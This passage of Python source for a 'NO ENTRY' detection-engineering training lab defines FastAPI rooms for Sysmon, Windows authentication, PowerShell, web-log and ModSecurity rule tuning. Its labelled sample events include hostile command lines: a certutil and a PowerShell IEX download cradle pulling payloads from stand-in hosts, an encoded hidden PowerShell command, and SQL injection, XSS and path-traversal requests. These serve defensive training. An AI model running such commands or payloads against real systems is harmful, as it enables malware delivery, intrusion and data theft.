                "message": "Prerequisites incomplete: Sigma syntax must be evaluated and condition logic tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "SIGMA" in action or "SYNTAX" in action or action == "SIGMA_SYNTAX_VALIDATED":
            state["sigma_syntax_validated"] = True
            return JSONResponse({
                "status": "SIGMA_SYNTAX_VALIDATED",
                "verification_token": "SIGMA_SYNTAX_VALIDATED",
                "message": "Sigma Syntax challenge validated: generic rule successfully compiled into portable query dialects.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_SIGMA_SYNTAX')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_SIGMA_SYNTAX').",
    })


# ============================================================================
# DETECTION ROOM 04: WRITING PROCESS CREATION RULES (PORT 8404)
# ============================================================================

detection_process_creation_app = FastAPI(title="NO ENTRY Process Creation Rules Hub")


@detection_process_creation_app.api_route("/", methods=["GET", "HEAD"])
def detection_process_creation_root():
    return JSONResponse({
        "status": "PROCESS_CREATION_ACTIVE",
        "service": "Writing Process Creation Rules (Sysmon Event ID 1) Hub",
        "port": 8404,
        "room_id": "detect-04-process-creation-rules",
    })


@detection_process_creation_app.get("/api/detection/process-creation/telemetry")
def detection_process_creation_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "SYSMON_EVENT_1_DATASET",
        "events": [
            {
                "EventID": 1,
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -urlcache -split -f http://malicious.c2.internal/beacon.exe C:\\Windows\\Temp\\beacon.exe",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "OriginalFileName": "CertUtil.exe",
                "label": "ATTACK_POSITIVE",
            },
            {
                "EventID": 1,
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -verify C:\\Certs\\CorporateCA.crt",
                "ParentImage": "C:\\Windows\\System32\\mmc.exe",
                "OriginalFileName": "CertUtil.exe",
                "label": "BENIGN_ADMINISTRATIVE",
            },
        ],
    })


@detection_process_creation_app.post("/api/detection/process-creation/emulate")
@detection_process_creation_app.post("/api/detection-process-creation/emulate")
async def detection_process_creation_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_process_creation_state(sess_id)
    state["process_creation_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "PROCESS_CREATION_VERIFIED",
        "verification_token": "PROCESS_CREATION_VERIFIED",
        "event_source": "Microsoft-Windows-Sysmon/Operational",
        "event_id": 1,
        "message": "Sysmon Event ID 1 process creation detection rule verified against attack and baseline datasets.",
    })


@detection_process_creation_app.post("/api/detection/process-creation/tune-lolbin-filter")
@detection_process_creation_app.post("/api/detection-process-creation/tune-lolbin-filter")
async def detection_process_creation_tune_filter(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_process_creation_state(sess_id)
    state["lolbin_filter_tuned"] = True
    return JSONResponse({
        "status": "LOLBIN_FILTER_TUNED_OK",
        "message": "LOLBIN exclusion filter tuned: benign administrative certutil -verify execution excluded.",
    })


@detection_process_creation_app.api_route("/challenge", methods=["GET", "POST"])
async def detection_process_creation_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_process_creation_state(sess_id)
        if not (state.get("process_creation_emulated") and state.get("lolbin_filter_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Process creation detection must be evaluated and LOLBIN filter tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "PROCESS" in action or "CREATION" in action or action == "PROCESS_CREATION_VALIDATED":
            state["process_creation_validated"] = True
            return JSONResponse({
                "status": "PROCESS_CREATION_VALIDATED",
                "verification_token": "PROCESS_CREATION_VALIDATED",
                "message": "Process Creation detection challenge validated: LOLBIN download cradles detected with zero false positives.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_PROCESS_CREATION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_PROCESS_CREATION').",
    })


# ============================================================================
# DETECTION ROOM 05: WRITING NETWORK CONNECTION RULES (SYS MON EVENT ID 3) (PORT 8405)
# ============================================================================

detection_network_rules_app = FastAPI(title="NO ENTRY Network Connection Rules Hub")


@detection_network_rules_app.api_route("/", methods=["GET", "HEAD"])
def detection_network_rules_root():
    return JSONResponse({
        "status": "NETWORK_RULES_ACTIVE",
        "service": "Writing Network Connection Rules (Sysmon Event ID 3) Hub",
        "port": 8405,
        "room_id": "detect-05-network-connection-rules",
    })


@detection_network_rules_app.get("/api/detection/network-rules/telemetry")
@detection_network_rules_app.get("/api/detection-network-rules/telemetry")
def detection_network_rules_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "SYSMON_EVENT_3_DATASET",
        "events": [
            {
                "EventID": 3,
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "DestinationIp": "198.51.100.44",
                "DestinationPort": 8443,
                "Protocol": "tcp",
                "Initiated": "true",
                "label": "ATTACK_POSITIVE",
            },
            {
                "EventID": 3,
                "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "DestinationIp": "142.250.190.46",
                "DestinationPort": 443,
                "Protocol": "tcp",
                "Initiated": "true",
                "label": "BENIGN_BROWSER_TRAFFIC",
            },
        ],
    })


@detection_network_rules_app.post("/api/detection/network-rules/emulate")
@detection_network_rules_app.post("/api/detection-network-rules/emulate")
async def detection_network_rules_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_network_rules_state(sess_id)
    state["network_connection_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "NETWORK_DETECTION_VERIFIED",
        "verification_token": "NETWORK_DETECTION_VERIFIED",
        "event_source": "Microsoft-Windows-Sysmon/Operational",
        "event_id": 3,
        "message": "Sysmon Event ID 3 network connection rule verified: non-standard port beaconing flagged.",
    })


@detection_network_rules_app.post("/api/detection/network-rules/tune-filter")
@detection_network_rules_app.post("/api/detection-network-rules/tune-filter")
async def detection_network_rules_tune_filter(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_network_rules_state(sess_id)
    state["network_filter_tuned"] = True
    return JSONResponse({
        "status": "NETWORK_FILTER_TUNED_OK",
        "message": "Network filter tuned: benign standard browser HTTPS egress excluded from alert stream.",
    })


@detection_network_rules_app.api_route("/challenge", methods=["GET", "POST"])
@detection_network_rules_app.api_route("/api/detection/network-rules/challenge", methods=["GET", "POST"])
@detection_network_rules_app.api_route("/api/detection-network-rules/challenge", methods=["GET", "POST"])
async def detection_network_rules_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_network_rules_state(sess_id)
        if not (state.get("network_connection_emulated") and state.get("network_filter_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Network connection rule must be emulated and filter tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "NETWORK" in action or action == "NETWORK_DETECTION_VALIDATED":
            state["network_connection_validated"] = True
            return JSONResponse({
                "status": "NETWORK_DETECTION_VALIDATED",
                "verification_token": "NETWORK_DETECTION_VALIDATED",
                "message": "Network Connection detection challenge validated: outbound C2 beaconing detected on non-standard ports.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_NETWORK_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_NETWORK_DETECTION').",
    })


# ============================================================================
# DETECTION ROOM 06: WRITING FILE & REGISTRY INTEGRITY RULES (PORT 8406)
# ============================================================================

detection_file_registry_app = FastAPI(title="NO ENTRY File & Registry Integrity Rules Hub")


@detection_file_registry_app.api_route("/", methods=["GET", "HEAD"])
def detection_file_registry_root():
    return JSONResponse({
        "status": "FILE_REGISTRY_ACTIVE",
        "service": "Writing File & Registry Integrity Rules Hub",
        "port": 8406,
        "room_id": "detect-06-file-registry-rules",
    })


@detection_file_registry_app.get("/api/detection/file-registry/telemetry")
@detection_file_registry_app.get("/api/detection-file-registry/telemetry")
def detection_file_registry_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "FILE_REGISTRY_DATASET",
        "events": [
            {
                "EventID": 13,
                "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "Details": "C:\\Users\\Public\\updater.exe",
                "Image": "C:\\Windows\\System32\\reg.exe",
                "label": "ATTACK_PERSISTENCE_RUNKEY",
            },
            {
                "EventID": 11,
                "TargetFilename": "C:\\Users\\Operator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat",
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "label": "ATTACK_STARTUP_FOLDER",
            },
            {
                "EventID": 13,
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\KeepRunningVersion",
                "Details": "10.0.19041",
                "Image": "C:\\Windows\\System32\\sppsvc.exe",
                "label": "BENIGN_SYSTEM_UPDATE",
            },
        ],
    })


@detection_file_registry_app.post("/api/detection/file-registry/emulate")
@detection_file_registry_app.post("/api/detection-file-registry/emulate")
async def detection_file_registry_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_file_registry_state(sess_id)
    state["file_registry_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "FILE_REGISTRY_VERIFIED",
        "verification_token": "FILE_REGISTRY_VERIFIED",
        "event_source": "Microsoft-Windows-Sysmon/Operational",
        "event_ids": [11, 13],
        "message": "File and Registry persistence detection rule verified against attack dataset.",
    })


@detection_file_registry_app.post("/api/detection/file-registry/tune-filter")
@detection_file_registry_app.post("/api/detection-file-registry/tune-filter")
async def detection_file_registry_tune_filter(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_file_registry_state(sess_id)
    state["registry_filter_tuned"] = True
    return JSONResponse({
        "status": "REGISTRY_FILTER_TUNED_OK",
        "message": "Registry filter tuned: benign Windows system platform services excluded from Run key alerts.",
    })


@detection_file_registry_app.api_route("/challenge", methods=["GET", "POST"])
@detection_file_registry_app.api_route("/api/detection/file-registry/challenge", methods=["GET", "POST"])
@detection_file_registry_app.api_route("/api/detection-file-registry/challenge", methods=["GET", "POST"])
async def detection_file_registry_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_file_registry_state(sess_id)
        if not (state.get("file_registry_emulated") and state.get("registry_filter_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: File/Registry integrity detection must be emulated and filter tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "FILE" in action or "REGISTRY" in action or action == "FILE_REGISTRY_VALIDATED":
            state["file_registry_validated"] = True
            return JSONResponse({
                "status": "FILE_REGISTRY_VALIDATED",
                "verification_token": "FILE_REGISTRY_VALIDATED",
                "message": "File & Registry Integrity challenge validated: persistence modifications accurately flagged with zero false positives.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_FILE_REGISTRY')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_FILE_REGISTRY').",
    })


# ============================================================================
# DETECTION ROOM 07: DETECTING AUTHENTICATION ABUSE (EVENT IDS 4624/4625/4672) (PORT 8407)
# ============================================================================

detection_auth_abuse_app = FastAPI(title="NO ENTRY Authentication Abuse Detection Hub")


@detection_auth_abuse_app.api_route("/", methods=["GET", "HEAD"])
def detection_auth_abuse_root():
    return JSONResponse({
        "status": "AUTH_ABUSE_ACTIVE",
        "service": "Detecting Authentication Abuse (Event IDs 4624/4625/4672) Hub",
        "port": 8407,
        "room_id": "detect-07-auth-abuse-rules",
    })


@detection_auth_abuse_app.get("/api/detection/auth-abuse/telemetry")
@detection_auth_abuse_app.get("/api/detection-auth-abuse/telemetry")
def detection_auth_abuse_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "AUTH_ABUSE_DATASET",
        "events": [
            {
                "EventID": 4625,
                "TargetUserName": "admin",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A",
                "IpAddress": "198.51.100.77",
                "LogonType": 3,
                "label": "ATTACK_PASSWORD_SPRAY",
            },
            {
                "EventID": 4672,
                "SubjectUserName": "admin",
                "PrivilegeList": ["SeDebugPrivilege", "SeTcbPrivilege"],
                "label": "ATTACK_SPECIAL_PRIVILEGE_ASSIGNMENT",
            },
            {
                "EventID": 4624,
                "TargetUserName": "svc-backup",
                "LogonType": 5,
                "IpAddress": "127.0.0.1",
                "label": "BENIGN_SERVICE_LOGON",
            },
        ],
    })


@detection_auth_abuse_app.post("/api/detection/auth-abuse/emulate")
@detection_auth_abuse_app.post("/api/detection-auth-abuse/emulate")
async def detection_auth_abuse_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_auth_abuse_state(sess_id)
    state["auth_abuse_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "AUTH_ABUSE_VERIFIED",
        "verification_token": "AUTH_ABUSE_VERIFIED",
        "event_source": "Microsoft-Windows-Security-Auditing",
        "monitored_event_ids": [4624, 4625, 4672],
        "message": "Windows authentication abuse detection rule verified: password spray and elevated logon abuse identified.",
    })


@detection_auth_abuse_app.post("/api/detection/auth-abuse/tune-baseline")
@detection_auth_abuse_app.post("/api/detection-auth-abuse/tune-baseline")
async def detection_auth_abuse_tune_baseline(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_auth_abuse_state(sess_id)
    state["auth_baseline_tuned"] = True
    return JSONResponse({
        "status": "AUTH_BASELINE_TUNED_OK",
        "message": "Authentication baseline tuned: service account scheduled batch logons (LogonType 5) excluded from anomaly count.",
    })


@detection_auth_abuse_app.api_route("/challenge", methods=["GET", "POST"])
@detection_auth_abuse_app.api_route("/api/detection/auth-abuse/challenge", methods=["GET", "POST"])
@detection_auth_abuse_app.api_route("/api/detection-auth-abuse/challenge", methods=["GET", "POST"])
async def detection_auth_abuse_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_auth_abuse_state(sess_id)
        if not (state.get("auth_abuse_emulated") and state.get("auth_baseline_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Authentication abuse rule must be emulated and baseline tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "AUTH" in action or action == "AUTH_ABUSE_VALIDATED":
            state["auth_abuse_validated"] = True
            return JSONResponse({
                "status": "AUTH_ABUSE_VALIDATED",
                "verification_token": "AUTH_ABUSE_VALIDATED",
                "message": "Authentication Abuse detection challenge validated: credential access and privilege escalation alerted accurately.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_AUTH_ABUSE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_AUTH_ABUSE').",
    })


# ============================================================================
# DETECTION ROOM 08: DETECTING POWERSHELL OBFUSCATION & DOWNLOAD CRADLES (PORT 8408)
# ============================================================================

detection_powershell_app = FastAPI(title="NO ENTRY PowerShell Obfuscation Detection Hub")


@detection_powershell_app.api_route("/", methods=["GET", "HEAD"])
def detection_powershell_root():
    return JSONResponse({
        "status": "POWERSHELL_OBFUSCATION_ACTIVE",
        "service": "Detecting PowerShell Obfuscation & Download Cradles Hub",
        "port": 8408,
        "room_id": "detect-08-powershell-obfuscation",
    })


@detection_powershell_app.get("/api/detection/powershell/telemetry")
@detection_powershell_app.get("/api/detection-powershell/telemetry")
def detection_powershell_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "POWERSHELL_OBFUSCATION_DATASET",
        "events": [
            {
                "EventID": 4104,
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')",
                "Path": "",
                "label": "ATTACK_DOWNLOAD_CRADLE",
            },
            {
                "EventID": 4104,
                "ScriptBlockText": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
                "Path": "",
                "label": "ATTACK_BASE64_ENCODED",
            },
            {
                "EventID": 4104,
                "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter *",
                "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ActiveDirectory",
                "label": "BENIGN_ADMINISTRATIVE_POWERSHELL",
            },
        ],
    })


@detection_powershell_app.post("/api/detection/powershell/emulate")
@detection_powershell_app.post("/api/detection-powershell/emulate")
async def detection_powershell_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_powershell_state(sess_id)
    state["powershell_obfuscation_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "POWERSHELL_DETECTION_VERIFIED",
        "verification_token": "POWERSHELL_DETECTION_VERIFIED",
        "event_source": "Microsoft-Windows-PowerShell/Operational",
        "event_id": 4104,
        "message": "PowerShell obfuscation and download cradle detection rule verified against ScriptBlock dataset.",
    })


@detection_powershell_app.post("/api/detection/powershell/tune-regex")
@detection_powershell_app.post("/api/detection-powershell/tune-regex")
async def detection_powershell_tune_regex(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_powershell_state(sess_id)
    state["cradle_regex_tuned"] = True
    return JSONResponse({
        "status": "CRADLE_REGEX_TUNED_OK",
        "message": "PowerShell regex tuned: case-insensitive flags and padding variations accommodated with zero false positives.",
    })


@detection_powershell_app.api_route("/challenge", methods=["GET", "POST"])
@detection_powershell_app.api_route("/api/detection/powershell/challenge", methods=["GET", "POST"])
@detection_powershell_app.api_route("/api/detection-powershell/challenge", methods=["GET", "POST"])
async def detection_powershell_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_powershell_state(sess_id)
        if not (state.get("powershell_obfuscation_emulated") and state.get("cradle_regex_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: PowerShell detection must be emulated and regex tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "POWERSHELL" in action or action == "POWERSHELL_DETECTION_VALIDATED":
            state["powershell_obfuscation_validated"] = True
            return JSONResponse({
                "status": "POWERSHELL_DETECTION_VALIDATED",
                "verification_token": "POWERSHELL_DETECTION_VALIDATED",
                "message": "PowerShell Obfuscation detection challenge validated: base64 cradles and reflection downloaders flagged accurately.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_POWERSHELL_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_POWERSHELL_DETECTION').",
    })


# ============================================================================
# DETECTION ROOM 09: WRITING WEB APPLICATION DETECTION RULES (PORT 8409)
# ============================================================================

detection_web_rules_app = FastAPI(title="NO ENTRY Web Application Detection Rules Hub")


@detection_web_rules_app.api_route("/", methods=["GET", "HEAD"])
def detection_web_rules_root():
    return JSONResponse({
        "status": "WEB_DETECTION_ACTIVE",
        "service": "Writing Web Application Detection Rules Hub",
        "port": 8409,
        "room_id": "detect-09-web-detection-rules",
    })


@detection_web_rules_app.get("/api/detection/web-rules/telemetry")
@detection_web_rules_app.get("/api/detection-web-rules/telemetry")
def detection_web_rules_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "WEB_APPLICATION_LOGS_DATASET",
        "events": [
            {
                "client_ip": "203.0.113.42",
                "method": "GET",
                "uri": "/search.php?q=test%27%20UNION%20SELECT%20null,username,password%20FROM%20users--",
                "status_code": 200,
                "user_agent": "sqlmap/1.6#stable",
                "label": "ATTACK_SQLI_UNION",
            },
            {
                "client_ip": "198.51.100.15",
                "method": "POST",
                "uri": "/comments.php",
                "status_code": 200,
                "body": "comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
                "user_agent": "Mozilla/5.0",
                "label": "ATTACK_XSS_STORED",
            },
            {
                "client_ip": "198.51.100.88",
                "method": "GET",
                "uri": "/view.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "status_code": 200,
                "user_agent": "curl/7.68.0",
                "label": "ATTACK_PATH_TRAVERSAL_LFI",
            },
            {
                "client_ip": "10.0.0.50",
                "method": "GET",
                "uri": "/index.php?category=electronics&page=1",
                "status_code": 200,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "label": "BENIGN_USER_BROWSE",
            },
        ],
    })


@detection_web_rules_app.post("/api/detection/web-rules/emulate")
@detection_web_rules_app.post("/api/detection-web-rules/emulate")
async def detection_web_rules_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_web_rules_state(sess_id)
    state["web_detection_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "WEB_DETECTION_VERIFIED",
        "verification_token": "WEB_DETECTION_VERIFIED",
        "event_source": "nginx-access-log",
        "monitored_vectors": ["SQLi", "XSS", "LFI"],
        "message": "Web application detection rules verified: SQLi, XSS, and LFI patterns flagged across HTTP access logs.",
    })


@detection_web_rules_app.post("/api/detection/web-rules/tune-urldecode")
@detection_web_rules_app.post("/api/detection-web-rules/tune-urldecode")
async def detection_web_rules_tune_urldecode(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_web_rules_state(sess_id)
    state["urldecode_tuned"] = True
    return JSONResponse({
        "status": "URL_DECODE_TUNED_OK",
        "message": "URL decode normalization filter applied: double-encoded payloads decoded before pattern matching.",
    })


@detection_web_rules_app.api_route("/challenge", methods=["GET", "POST"])
@detection_web_rules_app.api_route("/api/detection/web-rules/challenge", methods=["GET", "POST"])
@detection_web_rules_app.api_route("/api/detection-web-rules/challenge", methods=["GET", "POST"])
async def detection_web_rules_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_web_rules_state(sess_id)
        if not (state.get("web_detection_emulated") and state.get("urldecode_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Web detection rules must be emulated and URL decode filter tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "WEB" in action or action == "WEB_DETECTION_VALIDATED":
            state["web_detection_validated"] = True
            return JSONResponse({
                "status": "WEB_DETECTION_VALIDATED",
                "verification_token": "WEB_DETECTION_VALIDATED",
                "message": "Web application detection challenge validated: multi-vector attack traffic detected with zero evasion.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_WEB_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_WEB_DETECTION').",
    })


# ============================================================================
# DETECTION ROOM 10: MODSECURITY CORE RULE SET TUNING & CUSTOM RULES (PORT 8410)
# ============================================================================

detection_modsec_app = FastAPI(title="NO ENTRY ModSecurity Core Rule Set Tuning Hub")


@detection_modsec_app.api_route("/", methods=["GET", "HEAD"])
def detection_modsec_root():
    return JSONResponse({
        "status": "MODSEC_CRS_ACTIVE",
        "service": "ModSecurity Core Rule Set Tuning Hub",
        "port": 8410,
        "room_id": "detect-10-modsec-crs-tuning",
    })


@detection_modsec_app.get("/api/detection/modsec/telemetry")
@detection_modsec_app.get("/api/detection-modsec/telemetry")
def detection_modsec_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "MODSEC_AUDIT_DATASET",
        "events": [
            {
                "transaction_id": "W4o5K8AaBbCcDdEeFf",
                "client_ip": "198.51.100.77",
                "rule_id": 942100,
                "msg": "SQL Injection Attack Detected via libinjection",
                "anomaly_score": 5,
                "paranoia_level": 1,
                "label": "ATTACK_SQLI_LIBINJECTION",
            },
            {
                "transaction_id": "W4o5K9GgHhIiJjKkLl",
                "client_ip": "10.0.0.12",
                "rule_id": 920272,
                "msg": "Multiple URL Encoding Detected",
                "anomaly_score": 3,
                "paranoia_level": 2,
                "label": "BENIGN_FALSE_POSITIVE_ENCODING",
            },
            {
                "transaction_id": "W4o5L0MmNnOoPpQqRr",
                "client_ip": "203.0.113.19",
                "rule_id": 932100,
                "msg": "Remote Command Execution: Unix Shell Command Found",
                "anomaly_score": 5,
                "paranoia_level": 1,
                "label": "ATTACK_RCE_UNIX_SHELL",
            },
        ],
    })


@detection_modsec_app.post("/api/detection/modsec/emulate")
@detection_modsec_app.post("/api/detection-modsec/emulate")
async def detection_modsec_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_modsec_state(sess_id)
    state["modsec_crs_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "MODSEC_CRS_VERIFIED",
        "verification_token": "MODSEC_CRS_VERIFIED",
        "waf_engine": "ModSecurity/3.0.8",
        "ruleset": "OWASP_CRS/3.3.4",
        "message": "ModSecurity CRS rules verified: anomaly score evaluated and rule 942100 triggered on malicious query.",
    })


@detection_modsec_app.post("/api/detection/modsec/tune-paranoia")
@detection_modsec_app.post("/api/detection-modsec/tune-paranoia")
async def detection_modsec_tune_paranoia(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_modsec_state(sess_id)
    state["paranoia_tuned"] = True
    return JSONResponse({
        "status": "PARANOIA_LEVEL_TUNED_OK",
        "message": "ModSecurity CRS paranoia level tuned: PL2 enabled and false positive rule exclusion configured for /api/search.",
    })


@detection_modsec_app.api_route("/challenge", methods=["GET", "POST"])
@detection_modsec_app.api_route("/api/detection/modsec/challenge", methods=["GET", "POST"])
@detection_modsec_app.api_route("/api/detection-modsec/challenge", methods=["GET", "POST"])
async def detection_modsec_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_modsec_state(sess_id)
        if not (state.get("modsec_crs_emulated") and state.get("paranoia_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: ModSecurity CRS must be emulated and paranoia level tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "MODSEC" in action or action == "MODSEC_CRS_VALIDATED":
            state["modsec_crs_validated"] = True
            return JSONResponse({
                "status": "MODSEC_CRS_VALIDATED",
                "verification_token": "MODSEC_CRS_VALIDATED",
                "message": "ModSecurity CRS tuning challenge validated: anomaly score threshold reached without false positive blocking.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_MODSEC_CRS')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_MODSEC_CRS').",
    })


